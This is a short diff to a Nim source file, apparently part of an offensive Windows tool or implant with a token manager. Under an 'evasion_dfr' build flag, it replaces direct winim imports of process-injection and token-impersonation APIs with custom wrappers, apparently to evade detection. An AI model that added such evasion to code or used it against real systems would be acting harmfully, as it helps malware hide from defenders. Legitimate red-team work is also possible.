@@ -5,7 +5,11 @@ import std/[json, strformat, strutils, base64]
 import token_manager
 
 when defined(windows):
-  import winim/lean
+  when defined(evasion_dfr):
+    import winim/lean except VirtualAllocEx, VirtualProtectEx, WriteProcessMemory, CreateRemoteThread, OpenProcess, OpenProcessToken, DuplicateTokenEx, ImpersonateLoggedOnUser, AdjustTokenPrivileges
+    import ../utils/winapi
+  else:
+    import winim/lean
   
   const
     TH32CS_SNAPPROCESS = 0x00000002
